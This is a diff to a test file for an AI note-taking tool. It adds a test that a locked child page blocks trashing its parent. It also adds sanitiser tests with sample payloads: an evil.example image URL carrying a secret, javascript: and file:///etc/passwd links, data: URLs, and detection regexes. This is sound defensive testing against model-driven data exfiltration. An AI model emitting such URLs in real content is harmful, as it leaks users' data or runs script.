@@ -1,7 +1,7 @@
 import "fake-indexeddb/auto";
 import { beforeEach, describe, expect, it } from "vitest";
 import { db } from "../../db";
-import { callTool, safeMarkdown, slateTools, validate } from "./tools";
+import { callTool, safeBlocks, safeMarkdown, slateTools, validate } from "./tools";
 
 /** stand-ins for the editor's Markdown conversion: one paragraph per line */
 const written: string[] = [];
@@ -78,6 +78,14 @@ describe("pages", () => {
     expect([kept.title, kept.icon, !!kept.deletedAt]).toEqual(["舊筆記", undefined, false]);
     expect((await call("read_page", { id: p.id })).data.content).toBe("內容"); // reading is still fine
     await db.pages.update(p.id, { locked: false });
+    // a locked page further down protects the branch it is in
+    const child = (await call("create_page", { title: "重要附件", parent_id: p.id })).data;
+    await db.pages.update(child.id, { locked: true });
+    const refused = await call("trash_page", { id: p.id });
+    expect(refused.error).toBe(true);
+    expect(refused.text).toContain("重要附件");
+    expect(!!(await db.pages.get(p.id))!.deletedAt).toBe(false);
+    await db.pages.update(child.id, { locked: false });
     expect((await call("trash_page", { id: p.id })).data).toMatchObject({ trashed: true });
     expect(await call("read_page", { id: p.id })).toMatchObject({ error: true });
     expect((await call("search", { query: "舊筆記" })).data.pages).toEqual([]);
@@ -116,10 +124,33 @@ describe("content written by a model", () => {
     ].join("\n");
     const out = safeMarkdown(md);
     expect(out).not.toMatch(/!\[[^\]]*\]\(\s*<?https?:/); // no remote picture left
-    expect(out).not.toMatch(/<img|<iframe|javascript:|data:text/i);
+    expect(out).not.toMatch(/<img|<iframe|<\/iframe|javascript:|data:text/i);
     expect(out).toContain("[追蹤](https://evil.example/p.png?d=SECRET)"); // kept as a link the person may choose to click
     expect(out).toContain("[連結](https://example.com/a)");
     expect(out).toContain("![本機圖片](idb://abc123)"); // the workspace's own attachments still show
+  });
+
+  it("is checked again after parsing, whatever syntax produced it", () => {
+    const t = (text: string) => ({ type: "text", text, styles: {} });
+    const out = safeBlocks([
+      { type: "image", props: { url: "https://evil.example/p.png?d=SECRET", caption: "圖" } }, // e.g. from a reference-style image
+      { type: "video", props: { url: "https://evil.example/v.mp4" } },
+      { type: "image", props: { url: "data:image/png;base64,AAAA" } },
+      { type: "image", props: { url: "idb://abc" } },
+      { type: "paragraph", content: [t("看 "), { type: "link", href: "javascript:alert(1)", content: [t("這裡")] }, { type: "link", href: "https://ok.example", content: [t("好")] }, { type: "link", href: "#/p/x1", content: [t("內部")] }] },
+      { type: "bulletListItem", content: [t("外")], children: [{ type: "image", props: { url: "//evil.example/n.png" } }] },
+      { type: "table", content: { type: "tableContent", rows: [{ cells: [[{ type: "link", href: "file:///etc/passwd", content: [t("檔")] }], [t("b")]] }] } },
+    ]) as { type: string; props?: { url?: string }; content?: unknown; children?: { type: string }[] }[];
+    const text = JSON.stringify(out);
+    expect(out.map((b) => b.type)).toEqual(["paragraph", "paragraph", "paragraph", "image", "paragraph", "bulletListItem", "table"]);
+    expect(out[3].props!.url).toBe("idb://abc"); // the workspace's own picture is untouched
+    expect(out[5].children![0].type).toBe("paragraph"); // nested ones too
+    expect(text).not.toMatch(/javascript:|file:\/\/|data:image/);
+    expect(text).toContain('"href":"https://evil.example/p.png?d=SECRET"'); // now only a link to click
+    expect(text).toContain('"href":"https://ok.example"');
+    expect(text).toContain('"href":"#/p/x1"');
+    expect(text).toContain("這裡"); // the words of a dropped link stay
+    expect(text).toContain("檔");
   });
 
   it("is cleaned on the way into a page", async () => {
